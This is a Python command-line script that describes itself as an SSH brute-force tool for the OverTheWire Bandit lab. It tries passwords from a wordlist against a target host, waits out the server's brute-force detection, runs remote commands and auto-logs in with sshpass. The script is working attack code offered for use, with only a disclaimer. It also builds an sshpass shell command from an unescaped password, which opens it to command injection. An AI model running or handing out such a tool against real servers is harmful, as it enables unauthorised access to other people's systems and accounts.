#!/usr/bin/env python

'''
    pyssh.py - A simple ssh bruteforcer.

        This script is made to automate my www.overthewire.org bandit lab.
        Make sure you have permissions in using the script to ssh servers.

    Disclaimer:
        I am not liable for attacking / bruteforcing ssh servers using this script.

    NOTE:
        --connect option only works on linux.

    DEPENDENCIES:
        sshpass

        sudo apt-get install -y sshpass
'''

import argparse
import paramiko
import platform
import socket
import subprocess
import sys
import time


FAILED = '\033[31m[-]\033[0;0m'
SUCCESS = '\033[32m[+]\033[0;0m'
PROMPT = '\033[36m[>]\033[0;0m'
WORKING = '\033[33m[*]\033[0;0m'


def get_os():

    # Get Platform | LINUX | WINDOWS
    return platform.system()


def is_ssh_open(hostname, username, password, port, delay):

    # Initialize ssh client

    ssh = paramiko.SSHClient()

    # Accept unknown host

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:

        ssh.connect(hostname=hostname, username=username, password=password, port=port, timeout=1)

    # Host unreachable

    except socket.timeout:

        print('%s Target host is unreachable. Session timed out.' % (FAILED))
        sys.exit(1)

    except socket.gaierror:
        print('%s Unable to find target host.' % (FAILED))
        sys.exit(1)

    # Failed Authentication

    except paramiko.AuthenticationException as err:

        print('%s %s to target host on port %s' % (FAILED, err, port))

    # Retry with delay if detected
        # Default (Fastest): 1 min
        # 3: (Fast): 5 min
        # 2: (Slow): 15 min
        # 1: (Slowest): 1 hour

    except paramiko.SSHException:

        print('%s Connection Exceeded. Retrying in %s second(s).' % (PROMPT, delay))

        # Cancelable timeout
        for i in range(1, delay):
            time.sleep(1)

        return is_ssh_open(hostname, username, password, port, delay)

    else:

        # Connection established to ssh
        print('%s Connection Successful to target host on port %s.\n%s Password: %s' % (SUCCESS, port, SUCCESS, password))
        return True

def ssh_execute(hostname, username, password, port, command):

    # Execute a command to a server
    ssh = paramiko.SSHClient()

    try:
        # Accept unknown host
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # standard connection
        ssh.connect(hostname=hostname, username=username, password=password, port=port, timeout=1)

        # get the stdout  and error
        stdin, stdout, stderr = ssh.exec_command(command)

    except:
        pass

    else:

        output = stdout.readlines()
        error = stderr.readlines()

        if output:
            print('%s Command Executed: %s' % (SUCCESS, command))
            return '\n' + '\r'.join(output)

        if error:
            print('%s Command Executed: %s' % (SUCCESS, command))
            return '\n' + '\r'.join(error)


def open_passfile(host, username, password_file, port, delay):

    try:
        with open(password_file, 'r') as passfile:

            print('%s Connecting to ssh server.. ' % (WORKING))

            # perform brute force
            for password in passfile:

                password = password.strip()

                if is_ssh_open(host, username, password, port, delay):

                    password_found = password

                    passfile.close()

                    return password_found

    except FileNotFoundError:
        print('%s %s not found. Terminating script..' % (FAILED, password_file))


def auto_connect(username, password, port, host):

    os = get_os()

    if os == "Windows":

        print('%s ERROR: Auto Connect feature not supported on Windows platform.' % FAILED)
        sys.exit(0)

    if os == "Linux":

        # Check if sshpass is installed
        check_sshpass = subprocess.call(
            [
                '/bin/bash',
                '-c',
                "dpkg -l | grep sshpass"
            ]
        )

        if check_sshpass == 1:
            print('%s ERROR: Unable to connect. sshpass not found.' % FAILED)
            sys.exit(0)

        if check_sshpass == 0:

            port = str(port)

            subprocess.call(
                [
                    '/bin/bash',
                    '-c',
                    "sshpass -p \'%s\' ssh -p %s %s@%s" % (password, port, username, host)
                ]
            )


def main():

    # Create parser

    parser = argparse.ArgumentParser(
        description='A Simple python SSH bruteforce script.',
        allow_abbrev=False
    )

    parser.add_argument(
        '-H', '--host',
        metavar='',
        required=True,
        help='IP address or Hostname of SSH server to authenticate.'
    )

    parser.add_argument(
        '-u', '--username',
        metavar='',
        required=True,
        help='username. EX: [username]@1.1.1.1'
    )

    parser.add_argument(
        '-p', '--port',
        metavar='',
        help='Port 22 is default. If not specified'
    )

    parser.add_argument(
        '-t', '--timeout',
        metavar='',
        help='If the server detected a bruteforcer, adds a delay timeout 4 as default fastest 1 is the slowest'
    )

    # Group parser for password authentication

    group_pass = parser.add_mutually_exclusive_group(
        required=True
    )

    group_pass.add_argument(
        '-L', '--passwordlist',
        metavar='',
        help='Pass a file.txt that contain lists of passwords.'
    )

    group_pass.add_argument(
        '-P', '--password',
        metavar='',
        help='Pass a password as argument to authenticate in ssh.'
    )

    # Group parser for action

    group_action = parser.add_mutually_exclusive_group()

    group_action.add_argument(
        '-e', '--execute',
        metavar='',
        help='Execute a command to the server. Must be enclosed as string and used alongside with --password.'
    )

    group_action.add_argument(
        '-c', '--connect',
        action='store_true',
        help='Auto connect to SSH if the password is specified or found in the password list.'

    )

    args = parser.parse_args()

    # Timeout default
    if args.timeout is None:
        delay = 1

    # If timeout param is called and set
    # This will only trigger if a server detects bruteforce

    # 1 minute timeout
    elif args.timeout == '4':
        delay = 60

    # 5 minute timeout
    elif args.timeout == '3':
        delay = 300

    # 15 minute timeout
    elif args.timeout == '2':
        delay = 900

    # 45 minute timeout
    elif args.timeout == '1':
        delay = 2700

    else:
        print('%s Error: Timeout must be 1 - 4.' % (FAILED))
        sys.exit(1)

    # Parse arguments
    username = args.username
    host = args.host
    passwd_list = args.passwordlist
    passwd = args.password
    connection = args.connect
    command = args.execute

    # Default values
    port = 22

    # Check if port is specified

    try:
        if args.port:
            port = int(args.port)

    except ValueError:
        print('%s Incorrect port specified.' % FAILED)
        sys.exit(1)

    # Initialize password found
    password_found = None

    # Execute if --password option is used

    if passwd:

        is_ssh_open(host, username, passwd, port, delay)

        if command:

            output = ssh_execute(host, username, passwd, port, command)

            if output:
                print(output)

        # Connect to ssh using sshpass if --connect is specified
        if connection and passwd:

            auto_connect(username, passwd, port, host)

    # Execute if --passwordlist option is used

    if passwd_list:

        # Read the passwordlist using --passwordlist option
        password_found = open_passfile(host, username, passwd_list, port, delay)

        # Connect to ssh using sshpass if --connect is specified
        if connection and password_found:

            auto_connect(username, password_found, port, host)


if __name__ == '__main__':
    main()
